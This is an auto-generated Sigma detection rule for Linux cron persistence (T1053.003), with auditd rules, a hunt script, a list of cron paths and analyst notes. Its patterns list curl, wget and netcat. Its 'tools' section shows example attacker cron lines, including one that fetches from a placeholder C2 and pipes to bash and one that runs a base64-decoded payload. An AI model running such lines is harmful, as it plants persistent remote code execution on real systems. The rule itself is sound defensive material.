# sigma/rules/host/persistence/t1053_003_real_time_cron_file_write_detection_suspicious_p.yml
# Generated by TONK sigma-export.py - do not edit by hand.
# Source of truth: host/js/data/persistence.js
title: T1053.003 - Real-Time Cron File Write Detection (Suspicious payload patterns in cron writes (if content captured))
id: efa1fa72-9862-5782-8f28-48237a41d556
status: experimental
description: 'auditd write event to cron-controlled paths — /etc/crontab, /etc/cron.d/*, /var/spool/cron/crontabs/*, or crontab binary execution by non-root Query block: Suspicious payload patterns in cron writes (if content captured).'
references:
    - MITRE ATT&CK T1053.003
author: TONK Hunt Reference (6b74.dev)
date: 2026/07/21
tags:
    - attack.persistence
    - attack.t1053.003
    - attack.g0032
logsource:
    product: linux
    service: auditd
detection:
    selection:
        event.module: auditd
        tags: cron_persist
        auditd.log.a2:
            - '*curl*'
            - '*wget*'
            - '*bash*'
            - '*python*'
            - '*/tmp/*'
            - '*/dev/shm/*'
    condition: selection
falsepositives:
    - Unknown - baseline before enabling
level: medium
tonk:
    fidelity: full
    source_file: host/js/data/persistence.js
    domain: host
    technique: T1053.003
    technique_name: 'Scheduled Task/Job: Cron'
    os: linux
    query_block: 5 of 5
    original_query: |-
        event.module: "auditd"
        AND tags: "cron_persist"
        AND auditd.log.a2: (*curl* OR *wget* OR *bash* OR *python* OR */tmp/* OR */dev/shm/*)
    sysmon: |-
        # Auditd rules — add to /etc/audit/rules.d/persistence.rules
        # Watch all cron persistence write paths

        # System-wide crontab
        -w /etc/crontab -p wa -k cron_persist

        # cron fragment directory
        -w /etc/cron.d -p wa -k cron_persist

        # Per-user spool (Debian/Ubuntu path)
        -w /var/spool/cron/crontabs -p wa -k cron_persist

        # Per-user spool (RHEL/CentOS path)
        -w /var/spool/cron -p wa -k cron_persist

        # Periodic script directories
        -w /etc/cron.hourly -p wa -k cron_persist
        -w /etc/cron.daily -p wa -k cron_persist
        -w /etc/cron.weekly -p wa -k cron_persist
        -w /etc/cron.monthly -p wa -k cron_persist

        # Monitor crontab binary execution
        -a always,exit -F arch=b64 -S execve -F path=/usr/bin/crontab -k crontab_exec
        -a always,exit -F arch=b32 -S execve -F path=/usr/bin/crontab -k crontab_exec

        # After adding, reload: auditctl -R /etc/audit/rules.d/persistence.rules
        # Verify: auditctl -l | grep cron
    powershell: |-
        #!/bin/bash
        # T1053.003 - Cron Persistence Hunt
        # Run as root for full coverage

        echo "[*] === /etc/crontab ==="
        cat /etc/crontab 2>/dev/null

        echo ""
        echo "[*] === /etc/cron.d/ contents ==="
        ls -la /etc/cron.d/ 2>/dev/null
        for f in /etc/cron.d/*; do
          [ -f "$f" ] || continue
          echo "--- $f ---"
          cat "$f"
        done

        echo ""
        echo "[*] === Periodic script dirs ==="
        for dir in /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /etc/cron.monthly; do
          echo "--- $dir ---"
          ls -la "$dir" 2>/dev/null
        done

        echo ""
        echo "[*] === Per-user crontabs (spool) ==="
        # Debian/Ubuntu
        ls -la /var/spool/cron/crontabs/ 2>/dev/null
        for f in /var/spool/cron/crontabs/*; do
          [ -f "$f" ] || continue
          echo "--- $(basename $f) ---"
          cat "$f"
        done
        # RHEL/CentOS
        ls -la /var/spool/cron/ 2>/dev/null
        for f in /var/spool/cron/*; do
          [ -f "$f" ] || continue
          echo "--- RHEL spool: $(basename $f) ---"
          cat "$f"
        done

        echo ""
        echo "[*] === @reboot entries (highest persistence risk) ==="
        grep -rE "@reboot" /etc/cron* /var/spool/cron/ 2>/dev/null

        echo ""
        echo "[*] === Suspicious payload patterns ==="
        grep -rE 
          "(curl|wget|bash|python[23]?|nc |ncat|/tmp/|/dev/shm/|/var/tmp/|base64 |[|]bash)" 
          /etc/cron* /var/spool/cron/ 2>/dev/null

        echo ""
        echo "[*] === Recently modified cron files (last 7 days) ==="
        find /etc/cron* /var/spool/cron/ -mtime -7 -ls 2>/dev/null

        echo ""
        echo "[*] === Systemd timers (cron-alternative persistence) ==="
        systemctl list-timers --all 2>/dev/null | grep -v "^NEXT"
    registry: |-
        Primary cron persistence locations (Linux):

        System-level (requires root):
          /etc/crontab                   - system-wide crontab file
          /etc/cron.d/<name>             - cron fragment files
          /etc/cron.hourly/<script>      - scripts run each hour
          /etc/cron.daily/<script>       - scripts run each day
          /etc/cron.weekly/<script>      - scripts run weekly
          /etc/cron.monthly/<script>     - scripts run monthly

        User-level (any authenticated user):
          /var/spool/cron/crontabs/<user>  - Debian/Ubuntu path
          /var/spool/cron/<user>           - RHEL/CentOS path

        ESXi-specific:
          /var/spool/cron/crontabs/root    - direct write required
                                             (crontab command may be absent)

        Access control files (check if bypassed):
          /etc/cron.allow                - allowlist of permitted users
          /etc/cron.deny                 - denylist of blocked users
          (if cron.allow exists, only listed users can use cron)

        Common malware naming patterns in cron.d:
          systemd-update, .system, network-manager,
          atd, rsyslog, sysstat, update-motd (spoofed names)

        High-risk cron entry patterns:
          @reboot root /payload          - runs on every boot
          * * * * * root cmd             - every minute (max rate)
          */5 * * * * root cmd           - every 5 minutes
    ossdetect: |-
        Sigma rules:
        - file_event_lnx_crontab_file_modification.yml
        - proc_creation_lnx_crontab_execution.yml
        - file_event_lnx_cron_reboot_entry.yml
        - proc_creation_lnx_cron_susp_child.yml

        Atomic Red Team:
        - T1053.003 Test #1 (crontab -e/replacement)
        - T1053.003 Test #2 (drop to /etc/cron.d)
        - T1053.003 Test #3 (echo pipe to crontab)
        - T1053.003 Test #4 (periodic script dir drop)

        PANIX (Linux persistence simulation):
        - ./panix.sh --cron --default
          github.com/Aegrah/PANIX
          Tests all cron vectors including @reboot

        Elastic detection rules:
        - Potential Persistence via Cron Job
        - Cron Job Created or Changed
        - Persistence via a Cron Job with Suspicious Arguments

        Wazuh rules:
        - rule 550/550 (file modified) triggered on cron paths
          via /etc/ossec.conf syscheck configuration

        Velociraptor artifacts:
        - Linux.Sys.Crontab (enumerate all cron entries)
        - Linux.Detection.Artifacts (broader persistence sweep)

        rkhunter / chkrootkit:
        - Scan cron directories for unexpected scripts
        - Not real-time; scheduled sweep tool
    tools: |-
        APT actors and malware families known to use cron persistence:

        Rocke (CN) - cryptomining, installs cron jobs that continuously
          re-download and execute mining payloads; documented in multiple
          cloud server intrusion campaigns since 2018

        TeamTNT (financially motivated) - cloud credential theft + mining,
          establishes cron jobs for re-infection and C2 callbacks

        APT5 (CN) - NSA 2022 advisory documented cron modification in
          /var/cron/tabs/ on compromised Citrix ADC appliances

        APT38/BeagleBoyz (KP) - FASTCash 2.0 campaign used cron for
          scheduled ATM dispense commands; CISA/DISA advisory 2020

        GoldMax/Sunshuttle (RU) - Linux variant used @reboot crontab
          directive to survive reboots during long-dwell operations

        Kinsing (mul) - cloud-targeted, installs cron every minute to
          re-download from C2 server if payload is cleaned

        NKAbuse (KP) - Linux backdoor using GoBotKorea, uses cron
          for boot persistence per Kaspersky 2023 research

        ESXiArgs ransomware - modified cron on ESXi hosts via direct
          write to /var/spool/cron/crontabs/root

        Common attacker cron techniques:
          # Append (leaves history):
          (crontab -l 2>/dev/null; echo "* * * * * /tmp/.daemon") | crontab -

          # Direct write to system:
          echo "*/5 * * * * root curl http://C2/p|bash" > /etc/cron.d/.update

          # Encoded payload:
          echo "* * * * * root echo BASE64PAYLOAD|base64 -d|bash" >> /etc/crontab
    actors:
        - Rocke
        - APT5
        - Lazarus
        - GoldMax
        - TeamTNT
        - Kinsing
    analyst_notes: 'Cron is the single most common Linux persistence mechanism for opportunistic threat actors. Unlike Windows Run keys, cron entries require no active session - they survive reboots, user logouts, and process kills, re-executing on schedule. The @reboot directive is the highest-value IOC: it''s rarely used by legitimate software and is explicitly designed to run at startup, making it functionally identical to a Windows RunOnce key. Any @reboot entry written by a non-package-manager process should be investigated immediately. The /etc/cron.d directory is a major blind spot - administrators often monitor /etc/crontab but forget that individual files in /etc/cron.d receive no human review. Adversaries exploit this by naming their cron fragment after a legitimate package (systemd-update, network-manager-cron) to blend with expected entries. User-level crontabs in /var/spool/cron/crontabs are writable by any valid user without root - this means a compromised unprivileged account can establish cron persistence that survives across sessions. Detection strategy: pair file-integrity monitoring on all cron paths with process-creation events for the crontab binary; alert on any crontab execution from non-standard parents (web server processes, SSH sessions, unknown daemons). Run a scheduled baseline comparison of all cron content against known-good state.'
